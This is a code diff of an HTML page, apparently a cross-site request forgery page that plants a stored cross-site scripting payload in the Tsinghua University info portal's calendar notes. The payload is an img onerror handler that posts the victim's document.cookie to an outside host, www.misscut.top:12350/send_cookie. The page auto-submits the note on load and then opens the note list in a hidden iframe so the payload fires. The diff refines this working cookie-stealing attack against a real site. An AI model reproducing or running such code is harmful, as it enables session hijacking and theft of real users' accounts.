@@ -19,15 +19,15 @@
             id="crack-iframe">
     </iframe>
 </form>
+<div id="info-iframe-container"></div>
 
 
 <form method="post" action="http://info.tsinghua.edu.cn/minichan/cal/NoteIns_action.jsp"
       target="crack_frame"
       name="noteIns_form" id="note-ins-form">
-    <input name="title" type="text" id="noteIns-title" size=70 value="testtest">
+    <input name="title" type="text" id="noteIns-title" size=70 value="">
     <textarea name="body" cols="80" rows="10" id="noteIns-detail">testtesttesttest</textarea>
     <input id="crack-noteIns-button" type="submit" value="Crack">
-
 </form>
 
 
@@ -36,9 +36,14 @@
 <script>
     $(document).ready(function () {
         // $('#crack-ip-button').click();
-        $("#noteIns-title").val("onerror=\"d=document;t=d.createElement('form');t.action='http://www.misscut.top:12350/send_cookie';t.method='post';o=d.createElement('textarea');o.name='c';o.value=d.cookie;t.appendChild(o);d.body.appendChild(t);t.submit()\">");
+        $("#noteIns-title").val("12\"></a><img src=\"1\" onerror=\"d=document;t=d.createElement('form');t.action='http://www.misscut.top:12350/send_cookie';t.method='post';o=d.createElement('textarea');o.name='c';o.value=d.cookie;t.appendChild(o);d.body.appendChild(t);t.submit()\">");
         $('#crack-noteIns-button').click();
+        setTimeout(function () {
+            var htm = "<iframe hidden src=\"http://info.tsinghua.edu.cn/minichan/cal/NoteList.jsp\" name=\"crack_info_iframe\" id=\"crack-info-iframe\"></iframe>";
+            $("#info-iframe-container").html(htm);
+        }, 1000)
     })
+
 
 </script>
 </html>
